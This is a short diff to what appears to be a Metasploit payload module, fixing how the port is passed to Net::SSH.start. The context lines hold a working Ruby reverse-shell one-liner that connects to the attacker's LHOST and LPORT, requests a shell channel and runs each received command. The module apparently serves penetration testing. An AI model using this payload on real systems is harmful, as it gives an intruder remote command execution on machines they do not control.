@@ -43,7 +43,7 @@ module MetasploitModule
   def ruby_string
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    rbs = "Net::SSH.start(\"#{lhost}\",#{datastore['LPORT']},paranoid:false)"
+    rbs = "Net::SSH.start(\"#{lhost}\",port:#{datastore['LPORT']},paranoid:false)"
     rbs << '{|s|s.open_channel{|c|c.request_pty{|a|a.send_channel_request("shell")};'
     rbs << 'c.on_data{|a,d|begin;c.send_data(`#{d}`);rescue;end}};s.loop}'
     return rbs
